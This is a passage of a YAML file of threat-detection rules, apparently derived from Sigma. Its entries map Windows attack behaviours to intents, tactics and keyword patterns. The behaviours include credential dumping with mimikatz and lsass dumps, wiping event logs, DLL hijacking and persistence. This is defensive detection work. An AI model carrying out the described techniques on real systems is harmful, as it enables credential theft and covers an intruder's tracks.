      - powershell
      - timestomp
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_c2993223_6da8_4b1a_88ee_668b8bf315e9
  intent: reconnaissance
  tactic: discovery
  description: Detects usage of the Get-ADUser cmdlet to collect user information
    and output it to a file
  conditions:
    summary:
      regex_any:
      - user
      - discovery
      - export
      - aduser
      - cmdlet
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_05b3e303_faf0_4f4a_9b30_46cc13e69152
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: Detects calls to "Add-Content" cmdlet in order to modify the content
    of the user profile and potentially adding suspicious commands for persistence
  conditions:
    summary:
      regex_any:
      - potential
      - persistence
      - powershell
      - user
      - profile
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_953945c5_22fe_4a92_9f8a_a9edc1e522da
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: Detects usage of the "Set-Service" powershell cmdlet to configure a
    new SecurityDescriptor that allows a service to be hidden from other utilities
    such as "sc.exe", "Get-Service"...etc. (Works only in powershell 7)
  conditions:
    summary:
      regex_any:
      - abuse
      - service
      - permissions
      - hide
      - services
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_976d6e6f_a04b_4900_9713_0134a353e38b
  intent: credential_harvesting
  tactic: credential_access
  description: Detects execution of a PowerShell script that contains calls to the
    "Veeam.Backup" class, in order to dump stored credentials.
  conditions:
    summary:
      regex_any:
      - veeam
      - backup
      - servers
      - credential
      - dumping
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_1139d2e2_84b1_4226_b445_354492eba8ba
  intent: execution
  tactic: execution
  description: Detects the use of various web request commands with commandline tools
    and Windows PowerShell cmdlets (including aliases) via PowerShell scriptblock
    logs
  conditions:
    summary:
      regex_any:
      - usage
      - request
      - commands
      - cmdlets
      - scriptblock
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_e2812b49_bae0_4b21_b366_7c142eafcde2
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects usage of the WMI class "Win32_NTEventlogFile" in a potentially
    suspicious way (delete, backup, change permissions, etc.) from a PowerShell script
  conditions:
    summary:
      regex_any:
      - potentially
      - suspicious
      - call
      - win32_nteventlogfile
      - class
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_91109523_17f0_4248_a800_f81d9e7c081d
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects the execution of an MSI file using PowerShell and the WMI Win32_Product
    class
  conditions:
    summary:
      regex_any:
      - powershell
      - win32_product
      - install
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_488b44e7_3781_4a71_888d_c95abfacf44d
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects when a user disables the Windows Firewall via a Profile to
    help evade defense.
  conditions:
    summary:
      regex_any:
      - windows
      - firewall
      - profile
      - disabled
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_851c506b_6b7c_4ce2_8802_c703009d03c0
  intent: persistence_installation
  tactic: persistence
  description: 'Winlogon.exe is a Windows component responsible for actions at logon/logoff
    as well as the secure attention sequence (SAS) triggered by Ctrl-Alt-Delete.

    Registry entries in HKLM\Software[Wow6432Node]Microsoft\Windows NT\CurrentVersion\Winlogon\
    and HKCU\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\ are

    used to manage additional helper programs and functionalities that support Winlogon.
    Malicious modifications to these Registry keys may cause Winlogon to

    load and execute malicious DLLs and/or executables.

    '
  conditions:
    summary:
      regex_any:
      - winlogon
      - helper
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_03d83090_8cba_44a0_b02f_0b756a050306
  intent: execution
  tactic: execution
  description: Detects use of WinAPI functions in PowerShell scripts
  conditions:
    summary:
      regex_any:
      - potential
      - winapi
      - calls
      - powershell
      - scripts
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_c1344fa2_323b_4d2e_9176_84b4d4821c88
  intent: execution
  tactic: execution
  description: Detects modifications to the Windows Defender configuration settings
    using PowerShell to add exclusions
  conditions:
    summary:
      regex_any:
      - windows
      - defender
      - exclusions
      - added
      - powershell
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_8028c2c3_e25a_46e3_827f_bbb5abf181d7
  intent: execution
  tactic: execution
  description: Detects parameters used by WMImplant
  conditions:
    summary:
      regex_any:
      - wmimplant
      - hack
      - tool
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_9e07f6e7_83aa_45c6_998e_0af26efd0a85
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: Adversaries may establish persistence and elevate privileges by executing
    malicious content triggered by a Windows Management Instrumentation (WMI) event
    subscription.
  conditions:
    summary:
      regex_any:
      - powershell
      - persistence
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_09658312_bc27_4a3b_91c5_e49ab9046d1b
  intent: execution
  tactic: execution
  description: Detects known WMI recon method to look for unquoted service paths,
    often used by pentest inside of powershell scripts attackers enum scripts
  conditions:
    summary:
      regex_any:
      - wmic
      - unquoted
      - services
      - path
      - lookup
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_504d63cb_0dba_4d02_8531_e72981aace2c
  intent: defense_evasion
  tactic: defense_evasion
  description: Detect use of X509Enrollment
  conditions:
    summary:
      regex_any:
      - suspicious
      - x509enrollment
      - script
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_6c6c6282_7671_4fe9_a0ce_a2dcebdc342b
  intent: execution
  tactic: execution
  description: 'Adversaries may abuse PowerShell commands and scripts for execution.

    PowerShell is a powerful interactive command-line interface and scripting environment
    included in the Windows operating system. (Citation: TechNet PowerShell)

    Adversaries can use PowerShell to perform a number of actions, including discovery
    of information and execution of code

    '
  conditions:
    summary:
      regex_any:
      - powershell
      - execute
      - command
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_407aecb1_e762_4acf_8c7b_d087bcff3bb6
  intent: credential_harvesting
  tactic: credential_access
  description: 'Detects suspicious processes based on name and location that access
    the windows credential manager and vault.

    Which can be a sign of credential stealing. Example case would be usage of mimikatz
    "dpapi::cred" function

    '
  conditions:
    summary:
      regex_any:
      - credential
      - manager
      - access
      - uncommon
      - applications
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_7a2a22ea_a203_4cd3_9abf_20eb1c5c6cd2
  intent: credential_harvesting
  tactic: credential_access
  description: 'Detects file access requests to the Windows Credential History File
    by an uncommon application.

    This can be a sign of credential stealing. Example case would be usage of mimikatz
    "dpapi::credhist" function

    '
  conditions:
    summary:
      regex_any:
      - access
      - windows
      - credential
      - history
      - file
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_f41b0311_44f9_44f0_816d_dd45e39d4bc8
  intent: credential_harvesting
  tactic: credential_access
  description: 'Detects file access requests to crypto currency files by uncommon
    processes.

    Could indicate potential attempt of crypto currency wallet stealing.

    '
  conditions:
    summary:
      regex_any:
      - access
      - crypto
      - currency
      - wallets
      - uncommon
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_46612ae6_86be_4802_bc07_39b59feb1309
  intent: credential_harvesting
  tactic: credential_access
  description: 'Detects file access requests to the the Windows Data Protection API
    Master keys by an uncommon application.

    This can be a sign of credential stealing. Example case would be usage of mimikatz
    "dpapi::masterkey" function

    '
  conditions:
    summary:
      regex_any:
      - access
      - windows
      - dpapi
      - master
      - keys
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_d51694fe_484a_46ac_92d6_969e76d60d10
  intent: credential_harvesting
  tactic: credential_access
  description: Detects file access requests to potentially sensitive files hosted
    on the Windows Sysvol share.
  conditions:
    summary:
      regex_any:
      - access
      - potentially
      - sensitive
      - sysvol
      - files
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_65744385_8541_44a6_8630_ffc824d7d4cc
  intent: credential_harvesting
  tactic: credential_access
  description: 'Detects file access attempts to sensitive Microsoft teams files (leveldb,
    cookies) by an uncommon process.

    '
  conditions:
    summary:
      regex_any:
      - microsoft
      - teams
      - sensitive
      - file
      - access
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_558eebe5_f2ba_4104_b339_36f7902bcc1a
  intent: defense_evasion
  tactic: defense_evasion
  description: 'Attackers may change the file creation time of a backdoor to make
    it look like it was installed with the operating system.

    Note that many processes legitimately change the creation time of a file; it does
    not necessarily indicate malicious activity.

    '
  conditions:
    summary:
      regex_any:
      - file
      - creation
      - date
      - changed
      - another
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_9f383dc0_fdeb_4d56_acbc_9f9f4f8f20f3
  intent: unknown
  tactic: initial_access
  description: Detects an unexpected file being modified by dns.exe which my indicate
    activity related to remote code execution or other forms of exploitation as seen
    in CVE-2020-1350 (SigRed)
  conditions:
    summary:
      regex_any:
      - unusual
      - file
      - modification
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_5b2bbc47_dead_4ef7_8908_0cf73fcbecbf
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: Detect DLL deletions from Spooler Service driver folder. This might
    be a potential exploitation attempt of CVE-2021-1675
  conditions:
    summary:
      regex_any:
      - potential
      - printnightmare
      - exploitation
      - attempt
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_06125661_3814_4e03_bfa2_1e4411c60ac3
  intent: impact_operations
  tactic: impact
  description: Detects deletion of files with extensions often used for backup files.
    Adversaries may delete or remove built-in operating system data and turn off services
    designed to aid in the recovery of a corrupted system to prevent recovery.
  conditions:
    summary:
      regex_any:
      - backup
      - files
      - deleted
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_63c779ba_f638_40a0_a593_ddd45e8b1ddc
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects the deletion of the event log files which may indicate an attempt
    to destroy forensic evidence
  conditions:
    summary:
      regex_any:
      - eventlog
      - evtx
      - file
      - deleted
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_a55349d8_9588_4c5a_8e3b_1925fe2a4ffe
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects the deletion of the Exchange PowerShell cmdlet History logs
    which may indicate an attempt to destroy forensic evidence
  conditions:
    summary:
      regex_any:
      - exchange
      - powershell
      - cmdlet
      - history
      - deleted
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_3eb8c339_a765_48cc_a150_4364c04652bf
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects the deletion of IIS WebServer access logs which may indicate
    an attempt to destroy forensic evidence
  conditions:
    summary:
      regex_any:
      - webserver
      - access
      - logs
      - deleted
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_f01d1f70_cd41_42ec_9c0b_26dd9c22bf29
  intent: defense_evasion
  tactic: defense_evasion
  description: 'Detects the deletion of a process''s executable by itself. This is
    usually not possible without workarounds and may be used by malware to hide its
    traces.

    '
  conditions:
    summary:
      regex_any:
      - process
      - deletion
      - executable
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_ff301988_c231_4bd0_834c_ac9d73b86586
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects the deletion of the PowerShell console History logs which may
    indicate an attempt to destroy forensic evidence
  conditions:
    summary:
      regex_any:
      - powershell
      - console
      - history
      - logs
      - deleted
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_0a1f9d29_6465_4776_b091_7f43b26e4c89
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects the deletion of a prefetch file which may indicate an attempt
    to destroy forensic evidence
  conditions:
    summary:
      regex_any:
      - prefetch
      - file
      - deleted
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_270185ff_5f50_4d6d_a27f_24c3b8c9fef8
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects the deletion of tomcat WebServer logs which may indicate an
    attempt to destroy forensic evidence
  conditions:
    summary:
      regex_any:
      - tomcat
      - webserver
      - logs
      - deleted
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_6ddab845_b1b8_49c2_bbf7_1a11967f64bc
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects the deletion of files by the Sysinternals SDelete utility.
    It looks for the common name pattern used to rename files.
  conditions:
    summary:
      regex_any:
      - file
      - deleted
      - sysinternals
      - sdelete
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_8f0b1fb1_9bd4_4e74_8cdf_a8de4d2adfd0
  intent: unknown
  tactic: initial_access
  description: Detects an unexpected file being deleted by dns.exe which my indicate
    activity related to remote code execution or other forms of exploitation as seen
    in CVE-2020-1350 (SigRed)
  conditions:
    summary:
      regex_any:
      - unusual
      - file
      - deletion
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_3109530e_ab47_4cc6_a953_cac5ebcc93ae
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects the deletion of the "Zone.Identifier" ADS by an uncommon process.
    Attackers can leverage this in order to bypass security restrictions that make
    use of the ADS such as Microsoft Office apps.
  conditions:
    summary:
      regex_any:
      - zone
      - identifier
      - deleted
      - uncommon
      - application
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_75bf09fa_1dd7_4d18_9af9_dd9e492562eb
  intent: command_and_control_setup
  tactic: command_and_control
  description: Detects the creation of an "Active Directory Schema Cache File" (.sch)
    file by an uncommon tool.
  conditions:
    summary:
      regex_any:
      - adsi
      - cache
      - file
      - creation
      - uncommon
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_fed85bf9_e075_4280_9159_fbe8a023d6fa
  intent: reconnaissance
  tactic: discovery
  description: Detects the use of Advanced IP Scanner. Seems to be a popular tool
    for ransomware groups.
  conditions:
    summary:
      regex_any:
      - advanced
      - scanner
      - file
      - event
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_0b9ad457_2554_44c1_82c2_d56a99c42377
  intent: command_and_control_setup
  tactic: command_and_control
  description: 'An adversary may use legitimate desktop support and remote access
    software, such as Team Viewer, Go2Assist, LogMein, AmmyyAdmin, etc, to establish
    an interactive command and control channel to target systems within networks.

    These services are commonly used as legitimate technical support software, and
    may be allowed by application control within a target environment.

    Remote access tools like VNC, Ammyy, and Teamviewer are used frequently when compared
    with other legitimate software commonly used by adversaries. (Citation: Symantec
    Living off the Land)

    '
  conditions:
    summary:
      regex_any:
      - anydesk
      - temporary
      - artefact
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_2d367498_5112_4ae5_a06a_96e7bc33a211
  intent: command_and_control_setup
  tactic: command_and_control
  description: 'Detects AnyDesk writing binary files to disk other than "gcapi.dll".

    According to RedCanary research it is highly abnormal for AnyDesk to write executable
    files to disk besides gcapi.dll,

    which is a legitimate DLL that is part of the Google Chrome web browser used to
    interact with the Google Cloud API. (See reference section for more details)

    '
  conditions:
    summary:
      regex_any:
      - suspicious
      - binary
      - writes
      - anydesk
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_4c7f49ee_2638_43bb_b85b_ce676c30b260
  intent: execution
  tactic: execution
  description: 'Detects the creation of new DLL assembly files by "aspnet_compiler.exe",
    which could be a sign of "aspnet_compiler" abuse to proxy execution through a
    build provider.

    '
  conditions:
    summary:
      regex_any:
      - assembly
      - creation
      - aspnetcompiler
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_02773bed_83bf_469f_b7ff_e676e7d78bab
  intent: execution
  tactic: execution
  description: Detects default file names outputted by the BloodHound collection tool
    SharpHound
  conditions:
    summary:
      regex_any:
      - bloodhound
      - collection
      - files
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_65236ec7_ace0_4f0c_82fd_737b04fd4dcb
  intent: defense_evasion
  tactic: defense_evasion
  description: 'Detects the creation of new files with the ".evtx" extension in non-common
    or non-standard location.

    This could indicate tampering with default EVTX locations in order to evade security
    controls or simply exfiltration of event log to search for sensitive information
    within.

    Note that backup software and legitimate administrator might perform similar actions
    during troubleshooting.

    '
  conditions:
    summary:
      regex_any:
      - evtx
      - created
      - uncommon
      - location
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_df6ecb8b_7822_4f4b_b412_08f524b4576c
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: 'Detects the creation of system DLLs that are usually not present on
    the system (or at least not in system directories).

    Usually this technique is used to achieve DLL hijacking.

    '
  conditions:
    summary:
      regex_any:
      - creation
      - existent
      - system
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_ee63c85c_6d51_4d12_ad09_04e25877a947
  intent: persistence_installation
  tactic: persistence
  description: 'Adversaries may establish persistence and/or elevate privileges by
    executing malicious content triggered by application shims.

    The Microsoft Windows Application Compatibility Infrastructure/Framework (Application
    Shim) was created to allow for backward compatibility of software as the operating
    system codebase changes over time.

    '
  conditions:
    summary:
      regex_any:
      - custom
      - shim
      - database
      - created
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_97aa2e88_555c_450d_85a6_229bcd87efb8
  intent: persistence_installation
  tactic: persistence
  description: 'Adversaries may establish persistence by executing malicious content
    triggered by user inactivity.

    Screensavers are programs that execute after a configurable time of user inactivity
    and consist of Portable Executable (PE) files with a .scr file extension

    '
  conditions:
    summary:
      regex_any:
      - suspicious
      - screensaver
      - binary
      - file
      - creation
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_13c02350_4177_4e45_ac17_cf7ca628ff5e
  intent: defense_evasion
  tactic: defense_evasion
  description: 'Detects the creation of a file with the ".dll" extension that has
    the name of a System DLL in uncommon or unsuspected locations. (Outisde of "System32",
    "SysWOW64", etc.).

    It is highly recommended to perform an initial baseline before using this rule
    in production.

    '
  conditions:
    summary:
      regex_any:
      - files
      - with
      - system
      - name
      - unsuspected
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_d5866ddf_ce8f_4aea_b28e_d96485a20d3d
  intent: defense_evasion
  tactic: defense_evasion
  description: 'Detects the creation of an executable with a system process name in
    folders other than the system ones (System32, SysWOW64, etc.).

    It is highly recommended to perform an initial baseline before using this rule
    in production.

    '
  conditions:
    summary:
      regex_any:
      - files
      - with
      - system
      - process
      - name
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_8c3c76ca_8f8b_4b1d_aaf3_81aebcd367c9
  intent: persistence_installation
  tactic: persistence
  description: 'Adversaries may execute their own malicious payloads by hijacking
    vulnerable file path references.

    Adversaries can take advantage of paths that lack surrounding quotations by placing
    an executable in a higher level directory within the path, so that Windows will
    choose the adversary''s executable to launch.

    '
  conditions:
    summary:
      regex_any:
      - creation
      - service
      - with
      - unquoted
      - path
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_8fbf3271_1ef6_4e94_8210_03c2317947f6
  intent: credential_harvesting
  tactic: credential_access
  description: Files with well-known filenames (parts of credential dump software
    or files produced by them) creation
  conditions:
    summary:
      regex_any:
      - cred
      - dump
      - tools
      - dropped
      - files
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_002bdb95_0cf1_46a6_9e08_d38c128a6127
  intent: execution
  tactic: execution
  description: Detects a file ending in jse, vbe, js, vba, vbs written by cscript.exe
    or wscript.exe
  conditions:
    summary:
      regex_any:
      - wscript
      - cscript
      - dropper
      - file
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_f0e2b768_5220_47dd_b891_d57b96fc0ec1
  intent: unknown
  tactic: s0029
  description: Detects default CSExec service filename which indicates CSExec service
    installation and execution
  conditions:
    summary:
      regex_any:
      - csexec
      - service
      - file
      - creation
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_2f7979ae_f82b_45af_ac1d_2b10e93b0baa
  intent: lateral_movement
  tactic: lateral_movement
  description: Detects potential DLL hijack of "iertutil.dll" found in the DCOM InternetExplorer.Application
    Class over the network
  conditions:
    summary:
      regex_any:
      - potential
      - dcom
      - internetexplorer
      - application
      - hijack
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_b6f91281_20aa_446a_b986_38a92813a18f
  intent: defense_evasion
  tactic: defense_evasion
  description: 'Detects when an attacker create a similar folder structure to windows
    system folders such as (Windows, Program Files...)

    but with a space in order to trick DLL load search order and perform a "DLL Search
    Order Hijacking" attack

    '
  conditions:
    summary:
      regex_any:
      - search
      - order
      - hijackig
      - additional
      - space
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_aba15bdd_657f_422a_bab3_ac2d2a0d6f1c
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects the creation of a file with the ".dmp"/".hdmp" extension by
    a shell or scripting application such as "cmd", "powershell", etc. Often created
    by software during a crash. Memory dumps can sometimes contain sensitive information
    such as credentials. It's best to determine the source of the crash.
  conditions:
    summary:
      regex_any:
      - potentially
      - suspicious
      - hdmp
      - file
      - creation
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_15904280_565c_4b73_9303_3291f964e7f9
  intent: persistence_installation
  tactic: persistence
  description: 'Detects creation of a file named "ErrorHandler.cmd" in the "C:\WINDOWS\Setup\Scripts\"
    directory which could be used as a method of persistence

    The content of C:\WINDOWS\Setup\Scripts\ErrorHandler.cmd is read whenever some
    tools under C:\WINDOWS\System32\oobe\ (e.g. Setup.exe) fail to run for any reason.

    '
  conditions:
    summary:
      regex_any:
      - potential
      - persistence
      - attempt
      - errorhandler
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_bd1212e5_78da_431e_95fa_c58e3237a8e6
  intent: persistence_installation
  tactic: persistence
  description: Detects suspicious file type dropped by an Exchange component in IIS
    into a suspicious folder
  conditions:
    summary:
      regex_any:
      - suspicious
      - aspx
      - file
      - drop
      - exchange
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_6b269392_9eba_40b5_acb6_55c882b20ba6
  intent: unknown
  tactic: initial_access
  description: Detects suspicious file type dropped by an Exchange component in IIS
  conditions:
    summary:
      regex_any:
      - suspicious
      - file
      - drop
      - exchange
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_5d756aee_ad3e_4306_ad95_cb1abec48de2
  intent: command_and_control_setup
  tactic: command_and_control
  description: 'An adversary may use legitimate desktop support and remote access
    software, such as Team Viewer, Go2Assist, LogMein, AmmyyAdmin, etc, to establish
    an interactive command and control channel to target systems within networks.

    These services are commonly used as legitimate technical support software, and
    may be allowed by application control within a target environment.

    Remote access tools like VNC, Ammyy, and Teamviewer are used frequently when compared
    with other legitimate software commonly used by adversaries. (Citation: Symantec
    Living off the Land)

    '
  conditions:
    summary:
      regex_any:
      - gotoassist
      - temporary
      - installation
      - artefact
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_736ffa74_5f6f_44ca_94ef_1c0df4f51d2a
  intent: credential_harvesting
  tactic: credential_access
  description: Detects file creation events with filename patterns used by CrackMapExec.
  conditions:
    summary:
      regex_any:
      - hacktool
      - crackmapexec
      - file
      - indicators
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_93d94efc_d7ad_4161_ad7d_1638c4f908d8
  intent: credential_harvesting
  tactic: credential_access
  description: Detects the creation of the default dump file used by Outflank Dumpert
    tool. A process dumper, which dumps the lsass process memory
  conditions:
    summary:
      regex_any:
      - hacktool
      - dumpert
      - process
      - dumper
      - default
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_6ea858a8_ba71_4a12_b2cc_5d83312404c7
  intent: credential_harvesting
  tactic: credential_access
  description: Detects files written by the different tools that exploit HiveNightmare
  conditions:
    summary:
      regex_any:
      - hacktool
      - typical
      - hivenightmare
      - file
      - export
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_bb09dd3e_2b78_4819_8e35_a7c1b874e449
  intent: command_and_control_setup
  tactic: command_and_control
  description: Detects the presence and execution of Inveigh via dropped artefacts
  conditions:
    summary:
      regex_any:
      - hacktool
      - inveigh
      - execution
      - artefacts
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_3ab79e90_9fab_4cdf_a7b2_6522bc742adb
  intent: command_and_control_setup
  tactic: command_and_control
  description: Detects the creation of file with specific names used by RemoteKrbRelay
    SMB Relay attack module.
  conditions:
    summary:
      regex_any:
      - hacktool
      - remotekrbrelay
      - relay
      - secrets
      - dump
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_9e099d99_44c2_42b6_a6d8_54c3545cab29
  intent: credential_harvesting
  tactic: credential_access
  description: Detects the creation of files created by mimikatz such as ".kirbi",
    "mimilsa.log", etc.
  conditions:
    summary:
      regex_any:
      - hacktool
      - mimikatz
      - kirbi
      - file
      - creation
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_cad1fe90_2406_44dc_bd03_59d0b58fe722
  intent: credential_harvesting
  tactic: credential_access
  description: Detects the use of NPPSpy hacktool that stores cleartext passwords
    of users that logged in to a local file
  conditions:
    summary:
      regex_any:
      - hacktool
      - nppspy
      - hacktool
      - usage
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_602a1f13_c640_4d73_b053_be9a2fa58b96
  intent: defense_evasion
  tactic: defense_evasion
  description: 'Powerup tool''s Write Hijack DLL exploits DLL hijacking for privilege
    escalation.

    In it''s default mode, it builds a self deleting .bat file which executes malicious
    command.

    The detection rule relies on creation of the malicious bat file (debug.bat by
    default).

    '
  conditions:
    summary:
      regex_any:
      - hacktool
      - powerup
      - write
      - hijack
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_847def9e_924d_4e90_b7c4_5f581395a2b4
  intent: credential_harvesting
  tactic: credential_access
  description: Detects a dump file written by QuarksPwDump password dumper
  conditions:
    summary:
      regex_any:
      - hacktool
      - quarkspwdump
      - dump
      - file
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_6e2a900a_ced9_4e4a_a9c2_13e706f9518a
  intent: credential_harvesting
  tactic: credential_access
  description: Detects default filenames output from the execution of CrackMapExec
    and Impacket-secretsdump against an endpoint.
  conditions:
    summary:
      regex_any:
      - hacktool
      - potential
      - remote
      - credential
      - dumping
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_e074832a_eada_4fd7_94a1_10642b130e16
  intent: credential_harvesting
  tactic: credential_access
  description: Detects default lsass dump filename generated by SafetyKatz.
  conditions:
    summary:
      regex_any:
      - hacktool
      - safetykatz
      - dump
      - indicator
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_03f4ca17_de95_428d_a75a_4ee78b047256
  intent: credential_harvesting
  tactic: credential_access
  description: Detects file creation events with filename patterns used by Impacket.
  conditions:
    summary:
      regex_any:
      - hacktool
      - impacket
      - file
      - indicators
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_dbbd9f66_2ed3_4ca2_98a4_6ea985dd1a1c
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects attempts to create a DLL file to a known desktop application
    dependencies folder such as Slack, Teams or OneDrive and by an unusual process.
    This may indicate an attempt to load a malicious module via DLL search order hijacking.
  conditions:
    summary:
      regex_any:
      - potential
      - initial
      - access
      - search
      - order
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_9711de76_5d4f_4c50_a94f_21e4e8f8384d
  intent: command_and_control_setup
  tactic: command_and_control
  description: TeamViewer_Desktop.exe is create during install
  conditions:
    summary:
      regex_any:
      - installation
      - teamviewer
      - desktop
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_1908fcc1_1b92_4272_8214_0fbaf2fa5163
  intent: defense_evasion
  tactic: defense_evasion
  description: 'Detects creation of a malicious DLL file in the location where the
    OneDrive or Team applications

    Upon execution of the Teams or OneDrive application, the dropped malicious DLL
    file ("iphlpapi.dll") is sideloaded

    '
  conditions:
    summary:
      regex_any:
      - malicious
      - file
      - dropped
      - teams
      - onedrive
  weights:
    base: 0.6
    indicators_bonus: 0.1
